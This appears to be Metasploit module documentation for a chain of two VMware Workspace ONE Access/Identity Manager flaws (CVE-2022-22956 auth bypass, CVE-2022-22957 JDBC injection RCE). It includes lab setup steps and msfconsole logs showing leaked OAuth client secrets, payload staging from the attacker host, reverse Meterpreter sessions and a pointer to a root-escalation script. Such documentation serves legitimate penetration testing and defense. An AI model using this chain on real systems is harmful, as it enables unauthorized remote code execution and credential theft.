## Vulnerable Application

This module combines two vulnerabilities in order achieve remote code execution in the context of the `horizon` user.
The first vulnerability CVE-2022-22956 is an authentication bypass in OAuth2TokenResourceController ACS which allows
a remote, unauthenticated attacker to bypass the authentication mechanism and execute any operation. The second
vulnerability CVE-2022-22957 is a JDBC injection RCE specifically in the DBConnectionCheckController class's dbCheck 
method which allows an attacker to deserialize arbitrary Java objects which can allow remote code execution.

CVE-2022-22956 & CVE-2022-22957:

| Vulnerable Application  | Vulnerable version  |
|---|---|
| VMware Workspace ONE Access (Access)   |  21.08.0.1, 21.08.0.0, 20.10.0.1, 20.10.0.0  |
| VMware Identity Manager (vIDM)  |  3.3.6, 3.3.5, 3.3.4, 3.3.3  |
| VMware vRealize Automation (vRA)  |  8.x, 7.6  |
| VMware Cloud Foundation | 4.x | 
| vRealize Suite Lifecycle Manager | 8.x |

### Setup

In order to download a vulnerable application you do need VMware Customer Connect credentials. Navigate to
[Download VMware Workspace ONE Access (VIDM)](https://customerconnect.vmware.com/downloads/info/slug/desktop_end_user_computing/vmware_workspace_one_access_vidm/20_10).
to download the OVA file.
During VM Configuration within VMware Fusion, in Addition Settings input the following:

#### Application:

Timezone: (timezone of your choice)

Join the VMware Custom Experience Improvement Program: (deselect)

#### Networking Properties: (note the following may depend on your network configuration)

Host Name (FQDN): access01.corp.local

Default Gateway: 192.168.123.1

Domain Name: (blank)

Domain Search Path: (blank)

DNS: 192.168.123.1

IP Address: 192.168.123.16
Network: 255.255.255.0

Add the following line to your `/etc/hosts` file:
`192.168.123.16 access.test.local`

Be sure to change the network adapter of the VM to the network adapter that corresponds to the subnet of the static IP address you assigned above.

#### GUI Setup

Once running navigate to https://access.test.local:8443/cfg/setup
in order to complete the following setup requirements:

Set Passwords
- Appliance Administrator Account
- Appliance Root Account
- Remote User Account

Select Database
- Database Type: Internal Database

## Verification Steps

1. Start msfconsole
1. Do: `use linux/http/vmware_workspace_one_access_vmsa_2022_0011_chain`
1. Set the `RHOST`, `LHOST` and `TARGET` options
1. Run the module
1. Receive a Meterpreter session as the `horizon` user.

## Scenarios
### VMware Identity Manager 21.08.0.1-19010796
```
msf6 exploit(linux/http/vmware_workspace_one_access_vmsa_2022_0011_chain) > set rhosts 192.168.123.16
rhosts => 192.168.123.16
msf6 exploit(linux/http/vmware_workspace_one_access_vmsa_2022_0011_chain) > set lhost 192.168.123.1
lhost => 192.168.123.1
msf6 exploit(linux/http/vmware_workspace_one_access_vmsa_2022_0011_chain) > run

[*] Started reverse TCP handler on 192.168.123.1:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] Leaked client_id: acs
[+] Leaked client_secret: Oh2CB8n8PSrBER3NwXs41AaY3D49G7mt
[+] The target is vulnerable. Successfully by-passed authentication by exploiting CVE-2022-22956
[*] Using URL: http://192.168.123.1:8080/ONgtre.xml
[*] Sending stage (24772 bytes) to 192.168.123.16
[+] Now background this session with "bg" and then run "resource run_cve-2022-22960_lpe.rc" to get a root shell
[*] Meterpreter session 1 opened (192.168.123.1:4444 -> 192.168.123.16:53750) at 2023-04-07 10:28:46 -0400
[*] Server stopped.

meterpreter > getuid
Server username: horizon
meterpreter > sysinfo
Computer        : access01.corp.local
OS              : Linux 4.19.217-1.ph3 #1-photon SMP Thu Dec 2 02:29:27 UTC 2021
Architecture    : x64
System Language : en_US
Meterpreter     : python/linux
meterpreter > exit
[*] Shutting down Meterpreter...

[*] 192.168.123.16 - Meterpreter session 1 closed.  Reason: Died
msf6 exploit(linux/http/vmware_workspace_one_access_vmsa_2022_0011_chain) > set target 1
target => 1
msf6 exploit(linux/http/vmware_workspace_one_access_vmsa_2022_0011_chain) > run

[*] Started reverse TCP handler on 192.168.123.1:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] Leaked client_id: Service__OAuth2Client
[+] Leaked client_secret: 869zxHSe5G7m7KAUSFm4iw3ByZOTdLRc
[+] The target is vulnerable. Successfully by-passed authentication by exploiting CVE-2022-22956
[*] Using URL: http://192.168.123.1:8080/mQUV.xml
[*] Using URL: http://192.168.123.1:8080/JlLraNNZdU
[*] Sending stage (3045348 bytes) to 192.168.123.16
[+] Now background this session with "bg" and then run "resource run_cve-2022-22960_lpe.rc" to get a root shell
[*] Meterpreter session 2 opened (192.168.123.1:4444 -> 192.168.123.16:53818) at 2023-04-07 10:29:26 -0400
[*] Command Stager progress - 100.00% done (116/116 bytes)

meterpreter > getuid
Server username: horizon
meterpreter > sysinfo
Computer     : access01.corp.local
OS           : VMware Photon OS 3.0 (Linux 4.19.217-1.ph3)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux

```
